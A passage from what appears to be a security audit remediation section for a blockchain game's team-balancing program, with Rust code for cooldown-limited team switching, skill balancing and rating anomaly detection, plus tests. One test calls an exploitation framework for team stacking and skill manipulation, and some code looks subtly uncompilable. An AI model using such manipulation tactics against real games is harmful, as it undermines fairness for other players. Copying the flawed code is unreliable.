        let cooldown_period = 300; // 5 minutes in seconds
        let time_since_last = current_time - self.last_switch_time;

        time_since_last >= cooldown_period && self.switch_count < self.daily_limit
    }
}

pub fn secure_switch_team(
    ctx: Context<SecureSwitchTeam>,
    new_team: u8,
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let switch_cooldown = &mut ctx.accounts.switch_cooldown;
    let player_key = ctx.accounts.player.key();
    let clock = Clock::get()?;

    // Find player and current team
    let player_index = game_session.players.iter()
        .position(|&p| p == player_key)
        .ok_or(GameError::PlayerNotFound)?;

    let old_team = game_session.team_assignments[player_index];

    // Validate switch
    require!(
        old_team != new_team,
        GameError::SameTeamSwitch
    );

    // Simulate switch and check balance impact
    let mut test_assignments = game_session.team_assignments.clone();
    test_assignments[player_index] = new_team;

    let balance_after_switch = SkillBalancer::calculate_balance_metrics(
        &game_session.player_skills,
        &test_assignments,
    )?;

    require!(
        balance_after_switch.overall_balance_score >= game_session.balance_threshold,
        GameError::SwitchWouldImbalanceTeams
    );

    // Execute switch
    game_session.team_assignments[player_index] = new_team;
    game_session.team_balance_metrics = balance_after_switch;

    // Update cooldown
    switch_cooldown.last_switch_time = clock.unix_timestamp;
    switch_cooldown.switch_count += 1;

    emit!(TeamSwitched {
        session: ctx.accounts.game_session.key(),
        player: player_key,
        old_team,
        new_team,
        new_balance_score: balance_after_switch.overall_balance_score,
        timestamp: clock.unix_timestamp,
    });

    Ok(())
}
```

### 2. Advanced Skill Balancer

```rust
// Advanced skill-based team balancing algorithm
pub struct SkillBalancer;

impl SkillBalancer {
    pub fn calculate_balanced_teams(
        player_skills: &[SkillRating],
        num_teams: usize,
    ) -> Result<Vec<u8>, ProgramError> {
        require!(
            num_teams >= 2 && num_teams <= 4,
            GameError::InvalidTeamCount
        );

        let player_count = player_skills.len();
        require!(
            player_count >= num_teams * 2,
            GameError::InsufficientPlayers
        );

        // Sort players by skill rating
        let mut player_indices: Vec<usize> = (0..player_count).collect();
        player_indices.sort_by(|&a, &b| {
            player_skills[b].rating.cmp(&player_skills[a].rating)
        });

        // Use snake draft algorithm for balanced distribution
        let mut teams: Vec<Vec<usize>> = vec![Vec::new(); num_teams];
        let mut current_team = 0;
        let mut direction = 1; // 1 for forward, -1 for backward

        for player_idx in player_indices {
            teams[current_team].push(player_idx);

            // Move to next team using snake pattern
            if direction == 1 {
                current_team += 1;
                if current_team == num_teams {
                    current_team = num_teams - 1;
                    direction = -1;
                }
            } else {
                if current_team == 0 {
                    current_team = 0;
                    direction = 1;
                } else {
                    current_team -= 1;
                }
            }
        }

        // Convert to assignment vector
        let mut assignments = vec![0u8; player_count];
        for (team_id, team_players) in teams.iter().enumerate() {
            for &player_idx in team_players {
                assignments[player_idx] = team_id as u8;
            }
        }

        Ok(assignments)
    }

    pub fn calculate_balance_metrics(
        player_skills: &[SkillRating],
        assignments: &[u8],
    ) -> Result<TeamBalanceMetrics, ProgramError> {
        let mut team_skills: HashMap<u8, Vec<u64>> = HashMap::new();

        // Group skills by team
        for (i, &team) in assignments.iter().enumerate() {
            if i < player_skills.len() {
                team_skills.entry(team)
                    .or_insert_with(Vec::new)
                    .push(player_skills[i].rating);
            }
        }

        // Calculate team skill totals and averages
        let mut team_totals: Vec<u64> = Vec::new();
        let mut team_sizes: Vec<usize> = Vec::new();

        for skills in team_skills.values() {
            team_totals.push(skills.iter().sum());
            team_sizes.push(skills.len());
        }

        // Calculate skill variance
        let skill_variance = Self::calculate_skill_variance(&team_totals);

        // Calculate size balance
        let size_balance = Self::calculate_size_balance(&team_sizes);

        // Calculate overall balance score
        let overall_balance_score = Self::calculate_overall_balance(skill_variance, size_balance);

        Ok(TeamBalanceMetrics {
            skill_variance,
            size_balance,
            overall_balance_score,
            is_balanced: overall_balance_score >= 0.8, // 80% threshold
        })
    }

    fn calculate_skill_variance(team_totals: &[u64]) -> f64 {
        if team_totals.len() < 2 {
            return 1.0;
        }

        let mean = team_totals.iter().sum::<u64>() as f64 / team_totals.len() as f64;
        let variance = team_totals.iter()
            .map(|&total| {
                let diff = total as f64 - mean;
                diff * diff
            })
            .sum::<f64>() / team_totals.len() as f64;

        // Convert to balance score (lower variance = higher balance)
        let max_variance = mean * mean; // Maximum possible variance
        if max_variance > 0.0 {
            1.0 - (variance / max_variance).min(1.0)
        } else {
            1.0
        }
    }

    fn calculate_size_balance(team_sizes: &[usize]) -> f64 {
        if team_sizes.len() < 2 {
            return 1.0;
        }

        let max_size = *team_sizes.iter().max().unwrap_or(&0);
        let min_size = *team_sizes.iter().min().unwrap_or(&0);

        if max_size == 0 {
            return 1.0;
        }

        // Perfect balance when all teams are same size
        let size_difference = max_size - min_size;
        if size_difference <= 1 {
            1.0
        } else {
            1.0 - (size_difference as f64 / max_size as f64)
        }
    }

    fn calculate_overall_balance(skill_variance: f64, size_balance: f64) -> f64 {
        // Weighted combination of skill and size balance
        (skill_variance * 0.7) + (size_balance * 0.3)
    }
}
```

### 3. Skill Rating Validation System

```rust
// Secure skill rating system with anti-manipulation
use sha2::{Sha256, Digest};

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct SkillValidationSystem {
    pub rating_authority: Pubkey,
    pub validation_parameters: ValidationParameters,
    pub anomaly_detection: AnomalyDetection,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct ValidationParameters {
    pub min_games_for_rating: u32,
    pub confidence_threshold: f64,
    pub rating_change_limit: u64,
    pub validation_window: i64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct AnomalyDetection {
    pub enabled: bool,
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    pub detection_threshold: f64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct SuspiciousPattern {
    pub pattern_type: PatternType,
    pub detection_count: u32,
    pub last_detected: i64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub enum PatternType {
    RatingSpike,
    RatingDrop,
    InconsistentPerformance,
    CoordinatedBehavior,
}

impl SkillValidationSystem {
    pub fn validate_skill_rating(
        &self,
        player: &Pubkey,
        proposed_rating: &SkillRating,
        historical_ratings: &[SkillRating],
    ) -> Result<bool, ProgramError> {
        // Basic validation
        require!(
            proposed_rating.games_played >= self.validation_parameters.min_games_for_rating,
            GameError::InsufficientGamesPlayed
        );

        require!(
            proposed_rating.confidence >= self.validation_parameters.confidence_threshold,
            GameError::LowRatingConfidence
        );

        // Validate rating hash
        let expected_hash = Self::calculate_rating_hash(player, proposed_rating);
        require!(
            proposed_rating.validation_hash == expected_hash,
            GameError::InvalidRatingHash
        );

        // Check for suspicious patterns
        if self.anomaly_detection.enabled {
            let anomaly_score = self.detect_anomalies(proposed_rating, historical_ratings)?;
            require!(
                anomaly_score < self.anomaly_detection.detection_threshold,
                GameError::SuspiciousRatingPattern
            );
        }

        // Validate rating change limits
        if let Some(last_rating) = historical_ratings.last() {
            let rating_change = if proposed_rating.rating > last_rating.rating {
                proposed_rating.rating - last_rating.rating
            } else {
                last_rating.rating - proposed_rating.rating
            };

            require!(
                rating_change <= self.validation_parameters.rating_change_limit,
                GameError::ExcessiveRatingChange
            );
        }

        Ok(true)
    }

    fn calculate_rating_hash(player: &Pubkey, rating: &SkillRating) -> [u8; 32] {
        let mut hasher = Sha256::new();
        hasher.update(player.as_ref());
        hasher.update(&rating.rating.to_le_bytes());
        hasher.update(&rating.confidence.to_le_bytes());
        hasher.update(&rating.games_played.to_le_bytes());
        hasher.update(&rating.last_updated.to_le_bytes());

        let result = hasher.finalize();
        let mut hash = [0u8; 32];
        hash.copy_from_slice(&result);
        hash
    }

    fn detect_anomalies(
        &self,
        current_rating: &SkillRating,
        historical_ratings: &[SkillRating],
    ) -> Result<f64, ProgramError> {
        let mut anomaly_score = 0.0;

        if historical_ratings.len() < 2 {
            return Ok(0.0);
        }

        // Check for sudden rating spikes
        let recent_ratings: Vec<u64> = historical_ratings.iter()
            .rev()
            .take(5)
            .map(|r| r.rating)
            .collect();

        if let Some(&last_rating) = recent_ratings.first() {
            let rating_change_ratio = if last_rating > 0 {
                current_rating.rating as f64 / last_rating as f64
            } else {
                1.0
            };

            // Suspicious if rating changes by more than 50%
            if rating_change_ratio > 1.5 || rating_change_ratio < 0.5 {
                anomaly_score += 0.3;
            }
        }

        // Check for inconsistent performance patterns
        if recent_ratings.len() >= 3 {
            let variance = Self::calculate_rating_variance(&recent_ratings);
            let mean = recent_ratings.iter().sum::<u64>() as f64 / recent_ratings.len() as f64;

            if mean > 0.0 {
                let coefficient_of_variation = (variance.sqrt()) / mean;
                if coefficient_of_variation > 0.3 {
                    anomaly_score += 0.2;
                }
            }
        }

        // Check for rapid consecutive changes
        let rapid_changes = historical_ratings.windows(2)
            .filter(|window| {
                let time_diff = window[1].last_updated - window[0].last_updated;
                time_diff < 3600 // Less than 1 hour between updates
            })
            .count();

        if rapid_changes > 3 {
            anomaly_score += 0.25;
        }

        Ok(anomaly_score)
    }

    fn calculate_rating_variance(ratings: &[u64]) -> f64 {
        if ratings.len() < 2 {
            return 0.0;
        }

        let mean = ratings.iter().sum::<u64>() as f64 / ratings.len() as f64;
        let variance = ratings.iter()
            .map(|&rating| {
                let diff = rating as f64 - mean;
                diff * diff
            })
            .sum::<f64>() / ratings.len() as f64;

        variance
    }
}

// Enhanced error types
#[error_code]
pub enum GameError {
    #[msg("Team balance is already locked")]
    BalanceAlreadyLocked,

    #[msg("Insufficient balance quality")]
    InsufficientBalance,

    #[msg("Switch cooldown is still active")]
    SwitchCooldownActive,

    #[msg("Player not found in session")]
    PlayerNotFound,

    #[msg("Cannot switch to the same team")]
    SameTeamSwitch,

    #[msg("Switch would imbalance teams")]
    SwitchWouldImbalanceTeams,

    #[msg("Invalid team count")]
    InvalidTeamCount,

    #[msg("Insufficient players for teams")]
    InsufficientPlayers,

    #[msg("Insufficient games played for rating")]
    InsufficientGamesPlayed,

    #[msg("Low rating confidence")]
    LowRatingConfidence,

    #[msg("Invalid rating hash")]
    InvalidRatingHash,

    #[msg("Suspicious rating pattern detected")]
    SuspiciousRatingPattern,

    #[msg("Excessive rating change")]
    ExcessiveRatingChange,
}

// Event definitions
#[event]
pub struct TeamsBalanced {
    pub session: Pubkey,
    pub balance_score: f64,
    pub skill_variance: f64,
    pub timestamp: i64,
}

#[event]
pub struct TeamSwitched {
    pub session: Pubkey,
    pub player: Pubkey,
    pub old_team: u8,
    pub new_team: u8,
    pub new_balance_score: f64,
    pub timestamp: i64,
}
```

## Testing Requirements

### 1. Balance Algorithm Tests
```rust
#[cfg(test)]
mod balance_algorithm_tests {
    use super::*;

    #[test]
    fn test_skill_based_team_assignment() {
        let skills = vec![
            SkillRating { rating: 1000, confidence: 0.95, games_played: 100, last_updated: 0, validation_hash: [0; 32] },
            SkillRating { rating: 800, confidence: 0.90, games_played: 80, last_updated: 0, validation_hash: [0; 32] },
            SkillRating { rating: 1200, confidence: 0.98, games_played: 150, last_updated: 0, validation_hash: [0; 32] },
            SkillRating { rating: 900, confidence: 0.85, games_played: 90, last_updated: 0, validation_hash: [0; 32] },
        ];

        let assignments = SkillBalancer::calculate_balanced_teams(&skills, 2).unwrap();
        let metrics = SkillBalancer::calculate_balance_metrics(&skills, &assignments).unwrap();

        assert!(metrics.overall_balance_score > 0.7);
        assert!(metrics.is_balanced);
    }

    #[test]
    fn test_team_switching_restrictions() {
        // Test that team switching maintains balance requirements
        let mut session = create_test_session_with_balance();

        // Attempt switch that would imbalance teams
        let result = secure_switch_team_simulation(&mut session, 0, 1);

        // Should fail if it would create significant imbalance
        assert!(result.is_err());
    }
}
```

### 2. Anti-Manipulation Tests
```rust
#[cfg(test)]
mod anti_manipulation_tests {
    use super::*;

    #[tokio::test]
    async fn test_team_stacking_prevention() {
        let framework = TeamBalanceExploitationFramework::new(
            "http://localhost:8899",
            Pubkey::new_unique(),
            vec![Pubkey::new_unique()],
            vec![Keypair::new(); 10],
            TeamExploitationConfig {
                enable_team_stacking: true,
                enable_dynamic_switching: false,
                enable_skill_manipulation: false,
                coordination_delay: 1000,
                target_win_probability: 0.8,
            },
        );

        // This should fail with secure implementation
        let results = framework.execute_comprehensive_exploitation().await;
        assert!(results.is_err() || results.unwrap().overall_exploitation_rate < 0.3);
    }

    #[test]
    fn test_skill_rating_anomaly_detection() {
        let validator = SkillValidationSystem {
            rating_authority: Pubkey::new_unique(),
            validation_parameters: ValidationParameters {
                min_games_for_rating: 10,
                confidence_threshold: 0.8,
                rating_change_limit: 200,
                validation_window: 86400,
            },
            anomaly_detection: AnomalyDetection {
                enabled: true,
                suspicious_patterns: Vec::new(),
                detection_threshold: 0.5,
            },
        };

        // Test suspicious rating spike
        let suspicious_rating = SkillRating {
            rating: 2000, // 100% increase
            confidence: 0.9,
            games_played: 50,
            last_updated: 1000,
            validation_hash: [0; 32],
        };

        let historical = vec![
            SkillRating { rating: 1000, confidence: 0.8, games_played: 40, last_updated: 0, validation_hash: [0; 32] }
        ];

        let anomaly_score = validator.detect_anomalies(&suspicious_rating, &historical).unwrap();
        assert!(anomaly_score > 0.3); // Should detect anomaly
    }
}
```

---

**Remediation Priority**: Critical
**Estimated Fix Time**: 4-5 weeks
**Risk Level**: High - Team balance affects fundamental game fairness
**Verification Required**: Extensive testing with multiple team composition scenarios